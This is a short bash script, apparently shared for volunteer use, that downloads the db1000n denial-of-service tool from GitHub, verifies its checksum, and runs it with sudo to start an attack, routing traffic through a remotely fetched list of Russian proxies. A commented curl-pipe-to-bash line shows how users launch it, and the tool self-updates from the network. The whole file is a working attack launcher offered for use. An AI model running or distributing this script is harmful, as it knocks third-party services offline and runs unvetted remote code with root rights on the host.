#!/usr/bin/env bash
#curl -L https://raw.githubusercontent.com/Operation-Stop-russia/Gcloudshell_ddos/main/db1000n_proxy.sh | bash
set -euo pipefail
tput bold; tput setaf 2
REPO=${REPO:-"Arriven/db1000n"}

INSTALL_VERSION="linux_amd64"

BROWSER_DOWNLOAD_URL=$(curl -s "https://api.github.com/repos/${REPO}/releases/latest" | grep "${INSTALL_VERSION}" | grep -Eo 'https://[^\"]*')
CHECKSUM_DOWNLOAD_URL=$(curl -s "https://api.github.com/repos/${REPO}/releases/latest" | grep "checksums" | grep -Eo 'https://[^\"]*')

ARCHIVE=${BROWSER_DOWNLOAD_URL##*/}
CHECKSUMS_FILE=${CHECKSUM_DOWNLOAD_URL##*/}

tput bold; tput setaf 2; echo "Downloading an archive..."
echo "${BROWSER_DOWNLOAD_URL}" | xargs -n 1 curl -s -L -O
echo "Downloading checksums..."
echo "${CHECKSUM_DOWNLOAD_URL}" | xargs -n 1 curl -s -L -O

  SHA256_BINARY="sha256sum"
  SHA256_SUFFIX=""

echo "Checking sha256 hash..."
if ! command -v "${SHA256_BINARY}" &> /dev/null
then
  echo "Warning: sha256sum/shasum not found. Could not check archive integrity. Please be careful when launching the executable."
else
  SHA256SUM=$(${SHA256_BINARY} ${SHA256_SUFFIX} ${ARCHIVE})
  if ! grep -q "${SHA256SUM}" "${CHECKSUMS_FILE}"; then
    echo "shasum for ${ARCHIVE} failed. Please check the shasum. File may possibly be corrupted."
    exit 1
  fi
fi

tar xvf "${ARCHIVE}"
tput setaf 4; echo "db1000n successfully installed"
sleep 1
tput setaf 3; echo "Starting attack with using proxies"; tput setaf 2
sleep 5
sudo ./db1000n -proxy '{{ join (split (get_url "https://raw.githubusercontent.com/OleksandrBlack/proxy-scraper-checker/main/proxies/proxies_ru.txt") "\n") "," }}' -enable-self-update -restart-on-update=false
